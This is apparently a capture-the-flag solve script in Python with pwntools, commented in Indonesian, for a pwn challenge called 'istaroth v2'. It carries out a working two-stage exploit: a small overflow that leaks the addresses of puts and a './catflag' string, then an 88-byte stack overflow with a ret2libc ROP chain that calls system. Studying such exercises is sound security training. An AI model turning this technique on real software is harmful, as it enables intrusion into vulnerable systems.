#!/usr/bin/env python3
"""solve.py -- pwn_istaroth v2 (ret2libc, ROP chain asli, bukan ret2win)

Tahap 1: overflow data-only 64 byte + p32(1) -> set struct frame.unlocked
         != 0 tanpa sentuh saved-RBP/return-address -> program bocorkan
         DUA alamat: (1) &puts (resolved GLOB_DAT -> alamat ASLI di libc),
         (2) alamat string "./catflag" di .rodata binary ini sendiri
         (sudah termasuk PIE base, dipakai langsung).
Tahap 2: overflow 88 byte ke return address, lalu ROP chain BENERAN:
         1 gadget "ret" polos (fix alignment movaps, pola sama dengan
         Mavuika/Istaroth-v1 -- lihat NOTES.md) + "pop rdi; ret" dari libc
         + alamat string "./catflag" (leak tahap 1) + alamat system()
         (dihitung dari base libc tahap 1) -> system("./catflag").

Jalankan:
  python3 solve.py                              # test lokal (pakai ld/libc dari bin/)
  python3 solve.py REMOTE=1 HOST=127.0.0.1 PORT=40601   # lawan service nc
"""
import os
from pwn import *

BIN_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bin")

context.arch = "amd64"
exe = ELF(os.path.join(BIN_DIR, "istaroth"), checksec=False)
libc = ELF(os.path.join(BIN_DIR, "libc.so.6"), checksec=False)
context.binary = exe

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40601))
else:
    # Binary PIE dicompile lawan glibc yang DIPIN (2.35, Ubuntu 22.04) --
    # jalankan lewat ld-linux + --library-path yang sama (bin/libc.so.6 +
    # bin/ld-linux-x86-64.so.2, hasil extract dari image Docker), BUKAN
    # pakai dynamic linker/glibc sistem host (offset puts/system/gadget
    # bisa beda, lihat pwn_columbina/NOTES.md untuk alasan sama).
    io = process(
        [
            os.path.join(BIN_DIR, "ld-linux-x86-64.so.2"),
            "--library-path", BIN_DIR,
            os.path.join(BIN_DIR, "istaroth"),
        ],
        cwd=BIN_DIR,
    )

# --- Tahap 1: overflow data-only menimpa struct frame.unlocked ---
# offsetof(struct frame, unlocked) == 64 persis (buf[64] lalu int, tanpa
# padding karena 64 sudah kelipatan 4) -- dicek via objdump terhadap build
# yang baru (lihat NOTES.md v2).
UNLOCK_OFFSET = 64
payload1 = b"A" * UNLOCK_OFFSET + p32(1)

io.recvuntil(b"ritual dimulai.\n")
io.send(payload1)

io.recvuntil(b"ramalan: ")
leak_line = io.recvline().split()
puts_leak = int(leak_line[0], 16)
catflag_str_addr = int(leak_line[1], 16)
log.info(f"leaked puts(): {hex(puts_leak)}")
log.info(f"leaked \"./catflag\" string addr: {hex(catflag_str_addr)}")

libc.address = puts_leak - libc.symbols["puts"]
log.info(f"computed libc base: {hex(libc.address)}")

system_addr = libc.symbols["system"]
pop_rdi_ret = next(libc.search(asm("pop rdi; ret"), executable=True))
ret_gadget = next(libc.search(asm("ret"), executable=True))
log.info(f"system(): {hex(system_addr)}  pop rdi;ret: {hex(pop_rdi_ret)}")

# --- Tahap 2: overflow penuh -> ROP chain ret2libc ---
# offset ke return address = 88 byte (frame 0x50=80 + saved RBP 8),
# dicek via objdump terhadap build yang baru (lihat NOTES.md v2).
OFFSET = 88
rop_chain = p64(ret_gadget) + p64(pop_rdi_ret) + p64(catflag_str_addr) + p64(system_addr)
payload2 = b"B" * OFFSET + rop_chain
io.send(payload2)

flag = io.recvline_contains(b"TecFest26", timeout=5)
print(flag.decode().strip())
io.close()
